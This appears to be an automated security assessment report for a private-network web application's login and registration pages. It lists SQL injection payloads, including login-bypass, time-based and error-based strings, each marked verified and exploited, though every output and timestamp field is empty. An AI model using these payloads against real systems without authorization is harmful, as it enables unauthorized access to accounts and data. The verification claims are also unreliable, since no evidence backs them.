# CAL Security Assessment Report

**Target:** 192.168.127.128
**Generated:** Sat, 10 Jan 2026 01:30:54 KST
**Engaged Targets:** 5
**Vulnerability Candidates:** 7
**Verified Vulnerabilities:** 6

## Attack Targets
The following targets were identified and subjected to active security testing:
- `http://192.168.127.128`
- `http://192.168.127.128/sbadmin/`
- `http://192.168.127.128/sbadmin/act/login.php`
- `http://192.168.127.128/sbadmin/?p=register.php`
- `http://192.168.127.128/sbadmin/act/register.php`

## Executive Summary
**Found 7 vulnerability candidate(s)** pending verification:

- SQLi: 6 candidate(s)
- PathTraversal: 1 candidate(s)

**Confirmed 6 verified vulnerabilit(ies)**:

| Severity | Type | URL | Payload |
|---|---|---|---|
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/login.php` | `' OR '1'='1--` |
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/login.php` | `' OR '1'='1' --` |
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/register.php` | `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -` |
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/login.php` | `' OR '1'='1` |
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/register.php` | `test' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x74657374, (SELECT (ELT(1,1))), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -` |
| **High** | SQLi | `http://192.168.127.128/sbadmin/act/login.php` | `' OR '1'='1' -- ` |

## Vulnerability Candidates (Pending Verification)
The following potential vulnerabilities were identified and are awaiting active verification:

| Type | URL | Parameter | Status |
|---|---|---|---|
| SQLi | `http://192.168.127.128/sbadmin/./act/login.php` | `` | pending |
| SQLi | `http://192.168.127.128/sbadmin/act/login.php` | `email, password` | pending |
| SQLi | `http://192.168.127.128/sbadmin/act/register.php` | `email, password` | pending |
| SQLi | `http://192.168.127.128/sbadmin/act/register.php` | ``email`` | pending |
| SQLi | `http://192.168.127.128/sbadmin/?p=register.php/./act/register.php` | ``p`` | pending |
| SQLi | `http://192.168.127.128/sbadmin/?p=register.php/./act/register.php` | ``password`` | pending |
| PathTraversal | `http://192.168.127.128/sbadmin/?p=register.php/URL` | `` | pending |

## Verified Vulnerabilities (Exploited)
### 1. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/login.php`
- **Payload:** `' OR '1'='1--`
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

### 2. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/login.php`
- **Payload:** `' OR '1'='1' --`
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

### 3. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/register.php`
- **Payload:** `' OR (SELECT 1 FROM (SELECT(SLEEP(5)))a)-- -`
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

### 4. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/login.php`
- **Payload:** `' OR '1'='1`
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

### 5. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/register.php`
- **Payload:** `test' OR (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x74657374, (SELECT (ELT(1,1))), FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- -`
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

### 6. SQLi
- **Severity:** High
- **URL:** `http://192.168.127.128/sbadmin/act/login.php`
- **Payload:** `' OR '1'='1' -- `
- **Timestamp:** 
- **Description:**
Verified SQLi vulnerability. 
Error/Output: 

